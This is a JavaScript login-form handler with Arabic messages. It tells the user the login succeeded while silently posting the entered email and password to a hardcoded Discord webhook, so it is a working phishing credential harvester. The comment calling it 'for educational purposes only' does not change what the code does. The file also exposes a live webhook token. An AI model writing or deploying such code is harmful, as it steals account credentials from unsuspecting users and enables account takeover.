document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  document.getElementById("message").innerText = "تم تسجيل دخولك بنجاح ✅";

  // إرسال إلى Webhook (لأغراض تعليمية فقط)
  fetch("https://discord.com/api/webhooks/1384425928452608101/CRVV-cLTYRmRQF6jeu7cuCRLN4zE2jVmCMiATyboC_zowntOpAsJo7l1hSWaUShyCxGf", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: `📥 محاولة تسجيل دخول:\n📧 gmail: ${email}\n🔑pass: ${password}`
    })
  });
});
